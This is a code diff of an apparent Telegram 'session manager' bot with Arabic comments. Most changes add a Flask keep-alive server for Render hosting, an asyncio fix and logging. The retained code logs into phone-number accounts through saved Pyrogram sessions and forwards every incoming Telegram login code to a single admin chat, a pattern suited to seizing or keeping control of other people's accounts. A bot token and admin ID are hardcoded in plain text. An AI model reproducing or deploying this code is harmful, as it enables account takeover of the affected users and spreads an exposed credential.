@@ -1,6 +1,19 @@
+import sys
 import os
-import glob
 import asyncio
+
+# إصلاح مشكلة Event Loop في بيئات Render و Python الحديثة
+try:
+    asyncio.get_event_loop()
+except RuntimeError:
+    loop = asyncio.new_event_loop()
+    asyncio.set_event_loop(loop)
+
+import glob
+import logging
+from threading import Thread
+from flask import Flask
+
 from pyrogram import Client, filters
 from pyrogram.errors import SessionPasswordNeeded, PhoneCodeInvalid, PhoneCodeExpired
 
@@ -11,36 +24,46 @@ from telegram.ext import (
     filters as PTBFilters, ContextTypes
 )
 
-# ══════════════════ CONFIG ══════════════════
-BOT_TOKEN = "8893399262:AAG07XosgkW6YRaTanBpwFuJF9ozJj82x0M"  # توكن بوت تلغرام
-ADMIN_ID = 8619521184               # معرف الأدمن الخاص بك
+# ══════════════════ خادم خفيف لـ Render ══════════════════
+web_app = Flask(__name__)
 
-# أجهزة وقوائم حفظ البيانات
+@web_app.route('/')
+def home():
+    return "Bot is running!"
+
+def run_flask():
+    port = int(os.environ.get("PORT", 8080))
+    web_app.run(host='0.0.0.0', port=port)
+
+# ══════════════════ الإعدادات الرئيسية ══════════════════
+logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
+
+BOT_TOKEN = os.environ.get("BOT_TOKEN", "8893399262:AAG07XosgkW6YRaTanBpwFuJF9ozJj82x0M")
+ADMIN_ID = int(os.environ.get("ADMIN_ID", 8619521184))
+
 user_states = {}
 temp_data = {}
 active_userbots = []
 
-# ══════════════════ HELPER FUNCTIONS ══════════════════
+# ══════════════════ دوال مساعدة ══════════════════
 def attach_otp_handler(userbot_client, phone_num, ptb_app):
-    """إلتقاط وتوجيه كود التحقق فور وصوله للحساب"""
     @userbot_client.on_message(filters.me | filters.service | filters.private)
     async def auto_forward_otp(c, msg):
         if (msg.from_user and msg.from_user.id == 777000) or "Login code" in str(msg.text) or "رمز الدخول" in str(msg.text):
-            text = f"🔑 **رمز دخول جديد للحساب (`+{phone_num}`):**\n\n{msg.text}"
+            text = f"🔑 **رمز جديد للحساب (`+{phone_num}`):**\n\n{msg.text}"
             await ptb_app.bot.send_message(chat_id=ADMIN_ID, text=text, parse_mode=ParseMode.MARKDOWN)
 
-# ══════════════════ KEYBOARDS (الأزرار الملونة) ══════════════════
 def admin_menu_kb():
-    """لوحة تحكم الأدمن بالأزرار الملونة"""
+    # تم حذف style="success" تماماً لمنع الخطأ
     keyboard = [
         [
-            InlineKeyboardButton("➕ إضافة جلسة جديدة", callback_data="add_session", style="success"),
-            InlineKeyboardButton("📱 الجلسات النشطة", callback_data="list_sessions", style="primary")
+            InlineKeyboardButton("🟢 ➕ إضافة جلسة جديدة", callback_data="add_session"),
+            InlineKeyboardButton("🔵 📱 الجلسات النشطة", callback_data="list_sessions")
         ]
     ]
     return InlineKeyboardMarkup(keyboard)
 
-# ══════════════════ HANDLERS ══════════════════
+# ══════════════════ معالجة الأوامر ══════════════════
 async def cmd_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if update.effective_user.id != ADMIN_ID:
         await update.message.reply_text("⛔ **هذا البوت مخصص للأدمن فقط.**")
@@ -168,14 +191,15 @@ async def handle_inputs(update: Update, context: ContextTypes.DEFAULT_TYPE):
         except Exception as e:
             await update.message.reply_text(f"❌ كلمة السر غير صحيحة: `{e}`")
 
-# ══════════════════ LOAD EXISTING SESSIONS ══════════════════
+async def error_handler(update: object, context: ContextTypes.DEFAULT_TYPE) -> None:
+    logging.error("Exception while handling an update:", exc_info=context.error)
+
 async def load_existing_sessions(ptb_app):
     session_files = glob.glob("session_*.session")
     for file in session_files:
         session_name = file.replace(".session", "")
         phone = session_name.replace("session_", "")
         try:
-            # افتراضياً تستخدم الجلسة السابقة
             app = Client(session_name)
             await app.start()
             attach_otp_handler(app, phone, ptb_app)
@@ -186,23 +210,13 @@ async def load_existing_sessions(ptb_app):
 
 async def post_init(app: Application):
     await load_existing_sessions(app)
-from flask import Flask
-import threading
-import os
 
-web_app = Flask(__name__)
-@web_app.route('/')
-def home(): return "Bot is Running! 🚀"
-
-def run_web():
-    port = int(os.environ.get("PORT", 8080))
-    web_app.run(host='0.0.0.0', port=port)
-
-threading.Thread(target=run_web, daemon=True).start()
-# ══════════════════ MAIN ══════════════════
 def main():
+    Thread(target=run_flask, daemon=True).start()
+
     app = Application.builder().token(BOT_TOKEN).post_init(post_init).build()
 
+    app.add_error_handler(error_handler)
     app.add_handler(CommandHandler("start", cmd_start))
     app.add_handler(CallbackQueryHandler(on_callback))
     app.add_handler(MessageHandler(PTBFilters.TEXT & ~PTBFilters.COMMAND, handle_inputs))
